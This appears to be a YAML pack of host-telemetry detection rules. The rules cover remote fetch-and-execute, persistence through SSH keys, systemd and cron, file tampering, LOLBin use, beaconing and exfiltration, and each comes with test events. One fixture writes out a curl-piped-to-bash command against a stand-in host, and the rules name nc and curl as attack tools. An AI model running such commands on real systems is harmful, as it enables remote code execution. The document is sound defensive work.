schema_version: 1
pack: host
category: telemetry
pack_version: 1
maturity: stable

rules:
  - id: proc_remote_fetch_exec_v1
    name: "Remote fetch-and-execute process chain"
    description: "Process execution indicates remote download piped to interpreter or reverse shell primitives."
    status: "active"
    risk_score: 80
    source: "proc_exec"
    false_positives: "Automation scripts that intentionally bootstrap software over trusted channels."
    response: "Validate command origin, parent process lineage, and network destination trust."
    mitre:
      tactic: "execution"
      technique_id: "T1059"
      technique: "Command and Scripting Interpreter"
      confidence: 86
    enabled: true
    severity: "high"
    type: "aggregate_count"
    window: "3m"
    cooldown: "15m"
    match:
      event_type: "proc_exec"
      extra_exec_pattern_in: ["remote_fetch_exec", "reverse_shell"]
    group_by: ["agent_id", "proc_name", "dst_ip"]
    min_events: 1
    condition:
      operator: ">="
      value: 1
    tests:
      - name: "remote fetch exec fires"
        expected: match
        events:
          - {event_type: "proc_exec", agent_id: "agent-1", dst_ip: "198.51.100.10", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "remote_fetch_exec", exe_name: "curl", cmdline: "curl -fsSL https://x.test/i.sh | bash"}}
      - name: "interpreter pattern does not match this rule"
        expected: no_match
        events:
          - {event_type: "proc_exec", agent_id: "agent-1", dst_ip: "198.51.100.10", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "python3", cmdline: "python3 app.py"}}
      - name: "benign exec pattern does not fire"
        expected: no_match
        events:
          - {event_type: "proc_exec", agent_id: "agent-1", dst_ip: "198.51.100.10", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "normal_exec", exe_name: "ls", cmdline: "ls -la"}}

  - id: proc_service_shell_child_v1
    name: "Shell spawned by network-facing service"
    description: "Deprecated in favor of lotl_network_service_shell_spawn_chain_v1 (host/lotl), which detects the same service-spawned shell with a more specific ATT&CK sub-technique."
    status: "deprecated"
    source: "proc_exec"
    false_positives: "Superseded by lotl_network_service_shell_spawn_chain_v1."
    response: "Use lotl_network_service_shell_spawn_chain_v1 for active triage of service-spawned shells."
    mitre:
      tactic: "execution"
      technique_id: "T1059"
      technique: "Command and Scripting Interpreter"
      confidence: 82
    enabled: false
    severity: "high"
    type: "aggregate_count"
    window: "4m"
    cooldown: "20m"
    match:
      event_type: "proc_exec"
      extra_exec_pattern: "service_shell_child"
    group_by: ["agent_id", "proc_parent_name", "proc_name"]
    min_events: 1
    condition:
      operator: ">="
      value: 1
    tests:
      - id: service_spawned_shell_fires
        description: "A shell spawned from a network-facing service trips the deprecated detector."
        expect: hit
        events:
          - {"event_type": "proc_exec", "agent_id": "agent-1", "timestamp": "2026-06-01T00:00:00Z", "extra": {"exec_pattern": "service_shell_child", "exe_name": "sh", "parent_exe_name": "nginx"}}
      - id: interpreter_pattern_ignored
        description: "An interpreter execution pattern does not match the service-shell detector."
        expect: no_hit
        events:
          - {"event_type": "proc_exec", "agent_id": "agent-1", "timestamp": "2026-06-01T00:00:00Z", "extra": {"exec_pattern": "interpreter", "exe_name": "python3", "parent_exe_name": "cron"}}

  - id: persistence_authorized_keys_change_v1
    name: "Suspicious authorized_keys change"
    description: "SSH authorized_keys modified with persistence implications."
    status: "active"
    risk_score: 76
    source: "ssh_key_change"
    false_positives: "Legitimate key rotations performed by approved IAM workflows."
    response: "Review key diff, actor process lineage, and source account legitimacy."
    mitre:
      tactic: "persistence"
      technique_id: "T1098"
      technique: "Account Manipulation"
      confidence: 84
    enabled: true
    severity: "high"
    type: "aggregate_count"
    window: "10m"
    cooldown: "30m"
    match:
      event_type: "ssh_key_change"
      extra_action_in: ["create", "modify", "rename", "permission_change", "ownership_change"]
    group_by: ["agent_id", "fim_path"]
    min_events: 1
    condition:
      operator: ">="
      value: 1
    tests:
      - name: "authorized_keys modify fires"
        expected: match
        events:
          - {event_type: "ssh_key_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {action: "modify", path: "/root/.ssh/authorized_keys", path_category: "ssh_authorized_keys"}}
      - name: "key read access does not fire"
        expected: no_match
        events:
          - {event_type: "ssh_key_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {action: "access", path: "/root/.ssh/authorized_keys", path_category: "ssh_authorized_keys"}}
      - name: "key delete does not fire"
        expected: no_match
        events:
          - {event_type: "ssh_key_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {action: "delete", path: "/root/.ssh/authorized_keys", path_category: "ssh_authorized_keys"}}

  - id: persistence_systemd_unit_change_v1
    name: "Systemd persistence change"
    description: "Systemd unit or override changed in watched persistence paths."
    status: "active"
    risk_score: 54
    source: "persistence_systemd"
    false_positives: "Legitimate package upgrades and service rollout actions."
    response: "Validate service delta and ensure change ownership aligns with approved maintenance."
    mitre:
      tactic: "persistence"
      technique_id: "T1543"
      technique: "Create or Modify System Process"
      confidence: 80
    enabled: true
    severity: "medium"
    type: "aggregate_count"
    window: "10m"
    cooldown: "20m"
    match:
      event_type: "persistence_systemd"
    group_by: ["agent_id", "fim_path"]
    min_events: 1
    condition:
      operator: ">="
      value: 1
    tests:
      - name: "systemd persistence change fires"
        expected: match
        events:
          - {event_type: "persistence_systemd", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {path: "/etc/systemd/system/app.service", path_category: "systemd_unit", action: "modify"}}
      - name: "fim change does not match systemd rule"
        expected: no_match
        events:
          - {event_type: "fim_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {path: "/etc/hosts", path_category: "config_file", action: "modify"}}
      - name: "process exec does not match systemd rule"
        expected: no_match
        events:
          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "lolbin", exe_name: "curl"}}

  - id: persistence_cron_change_v1
    name: "Cron persistence change"
    description: "Cron path changed in a persistence-sensitive location."
    status: "active"
    risk_score: 52
    source: "persistence_cron"
    false_positives: "Scheduled maintenance jobs and expected patch automation."
    response: "Compare job command against baseline and validate ownership/mode drift."
    mitre:
      tactic: "persistence"
      technique_id: "T1053.003"
      technique: "Scheduled Task/Job: Cron"
      confidence: 78
    enabled: true
    severity: "medium"
    type: "aggregate_count"
    window: "10m"
    cooldown: "20m"
    match:
      event_type: "persistence_cron"
    group_by: ["agent_id", "fim_path"]
    min_events: 1
    condition:
      operator: ">="
      value: 1
    tests:
      - name: "cron persistence change fires"
        expected: match
        events:
          - {event_type: "persistence_cron", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {path: "/etc/cron.d/job", path_category: "cron", action: "modify"}}
      - name: "fim change does not match cron rule"
        expected: no_match
        events:
          - {event_type: "fim_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {path: "/etc/hosts", path_category: "config_file", action: "modify"}}
      - name: "systemd change does not match cron rule"
        expected: no_match
        events:
          - {event_type: "persistence_systemd", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {path: "/etc/systemd/system/app.service", path_category: "systemd_unit", action: "modify"}}

  - id: fim_security_tamper_v1
    name: "Security-sensitive file tamper"
    description: "FIM reported tamper on a security-sensitive path."
    status: "active"
    risk_score: 74
    source: "fim_change"
    false_positives: "Expected configuration hardening or policy updates."
    response: "Confirm authorized change window and inspect actor/process context."
    mitre:
      tactic: "defense_evasion"
      technique_id: "T1562"
      technique: "Impair Defenses"
      confidence: 76
    enabled: true
    severity: "high"
    type: "aggregate_count"
    window: "10m"
    cooldown: "20m"
    match:
      event_type: "fim_change"
      extra_tamper_related: true
    group_by: ["agent_id", "fim_path"]
    min_events: 1
    condition:
      operator: ">="
      value: 1
    tests:
      - name: "tamper-flagged security file change fires"
        expected: match
        events:
          - {event_type: "fim_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {action: "modify", path: "/etc/shadow", path_category: "security_file", tamper_related: true}}
      - name: "non-tamper change does not fire"
        expected: no_match
        events:
          - {event_type: "fim_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {action: "modify", path: "/etc/shadow", path_category: "security_file", tamper_related: false}}
      - name: "tamper flag on non-fim event does not fire"
        expected: no_match
        events:
          - {event_type: "persistence_cron", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {action: "modify", path: "/etc/cron.d/job", path_category: "cron", tamper_related: true}}

  - id: proc_lolbin_exec_v1
    name: "LOLBin pattern process execution"
    description: "Process execution classified by the agent as a living-off-the-land binary pattern. The procexec collector identifies this independently of the command-line content, catching cases where cmdline is truncated or obfuscated."
    status: "active"
    source: "proc_exec"
    maturity: "stable"
    risk_score: 55
    false_positives: "System management scripts legitimately invoking binaries such as curl, wget, nc, or python in expected automation contexts on known hosts."
    response: "Inspect the full process command line, parent lineage, and any outbound network activity from the same agent around the same time. If the parent is a non-interactive service or the destination is external, escalate. Add the agent_id to the allowlist for known automation hosts."
    mitre:
      tactic: "execution"
      technique_id: "T1218"
      technique: "System Binary Proxy Execution"
      confidence: 72
    enabled: true
    severity: "medium"
    type: "aggregate_count"
    window: "8m"
    cooldown: "20m"
    match:
      event_type: "proc_exec"
      extra_exec_pattern_in: ["lolbin"]
    group_by: ["agent_id", "proc_name", "proc_parent_name"]
    min_events: 2
    condition:
      operator: ">="
      value: 2
    tuning:
      allowlist:
        agent_ids: []
      threshold_scopes:
        - name: "prod-strict"
          when:
            environments: ["prod", "production"]
          min_events: 1
          condition: {operator: ">=", value: 1}
    tests:
      - name: "repeated lolbin execution fires"
        expected: match
        events:
          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "lolbin", exe_name: "nc", parent_exe_name: "bash"}}
          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "lolbin", exe_name: "nc", parent_exe_name: "bash"}}
      - name: "single lolbin event stays below threshold"
        expected: no_match
        events:
          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "lolbin", exe_name: "nc", parent_exe_name: "bash"}}
      - name: "non-lolbin pattern does not fire"
        expected: no_match
        events:
          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "python3", parent_exe_name: "bash"}}
          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "python3", parent_exe_name: "bash"}}

  - id: beacon_suspect_heuristic_v1
    name: "Beaconing heuristic signal"
    description: "Derived beaconing signal from periodic low-jitter outbound intervals. Fires on beacon_suspect events where the heuristic engine confirmed a periodic outbound pattern with sufficient confidence."
    status: "active"
    risk_score: 56
    source: "beacon_suspect"
    false_positives: "Expected health-check traffic to managed control endpoints with fixed polling intervals."
    response: "Review destination profile, process lineage, and historical interval pattern. Check heuristic_confidence and interval_mean_s in event details for tune-ability."
    mitre:
      tactic: "command_and_control"
      technique_id: "T1071"
      technique: "Application Layer Protocol"
      confidence: 78
    enabled: true
    severity: "medium"
    type: "aggregate_count"
    window: "20m"
    cooldown: "20m"
    match:
      event_type: "beacon_suspect"
      heuristic_name: "beacon_periodic_outbound"
      extra_confidence_gte: 65
    group_by: ["agent_id", "dst_ip", "dst_port"]
    min_events: 1
    condition:
      operator: ">="
      value: 1
    tests:
      - name: "confident periodic beacon fires"
        expected: match
        events:
          - {event_type: "beacon_suspect", agent_id: "agent-1", dst_ip: "203.0.113.9", dst_port: 443, timestamp: "2026-06-01T00:00:00Z", extra: {heuristic_name: "beacon_periodic_outbound", confidence: 80}}
      - name: "low confidence beacon does not fire"
        expected: no_match
        events:
          - {event_type: "beacon_suspect", agent_id: "agent-1", dst_ip: "203.0.113.9", dst_port: 443, timestamp: "2026-06-01T00:00:00Z", extra: {heuristic_name: "beacon_periodic_outbound", confidence: 50}}
      - name: "unrelated heuristic does not fire"
        expected: no_match
        events:
          - {event_type: "beacon_suspect", agent_id: "agent-1", dst_ip: "203.0.113.9", dst_port: 443, timestamp: "2026-06-01T00:00:00Z", extra: {heuristic_name: "jitter_only_signal", confidence: 90}}

  - id: exfil_suspect_heuristic_v1
    name: "Exfiltration heuristic signal"
    description: "Derived exfiltration signal from burst outbound bytes to rare destinations."
    status: "active"
    risk_score: 70
    source: "exfil_suspect"
    false_positives: "Large planned data transfers to new approved destinations."
    response: "Validate data movement purpose and inspect transfer process lineage."
    mitre:
      tactic: "exfiltration"
      technique_id: "T1048"
      technique: "Exfiltration Over Alternative Protocol"
      confidence: 82
    enabled: true
    severity: "high"
    type: "aggregate_count"
    window: "30m"
    cooldown: "30m"
    match:
      event_type: "exfil_suspect"
      extra_confidence_gte: 65
    group_by: ["agent_id", "dst_ip", "dst_port"]
    min_events: 1
    condition:
      operator: ">="
      value: 1
    tests:
      - name: "confident exfil burst fires"
        expected: match
        events:
          - {event_type: "exfil_suspect", agent_id: "agent-1", dst_ip: "203.0.113.9", dst_port: 443, timestamp: "2026-06-01T00:00:00Z", extra: {heuristic_name: "exfil_burst_rare_destination", confidence: 88}}
      - name: "low confidence exfil does not fire"
        expected: no_match
        events:
          - {event_type: "exfil_suspect", agent_id: "agent-1", dst_ip: "203.0.113.9", dst_port: 443, timestamp: "2026-06-01T00:00:00Z", extra: {heuristic_name: "exfil_burst_rare_destination", confidence: 50}}
      - name: "beacon event does not match exfil rule"
        expected: no_match
        events:
          - {event_type: "beacon_suspect", agent_id: "agent-1", dst_ip: "203.0.113.9", dst_port: 443, timestamp: "2026-06-01T00:00:00Z", extra: {heuristic_name: "beacon_periodic_outbound", confidence: 88}}
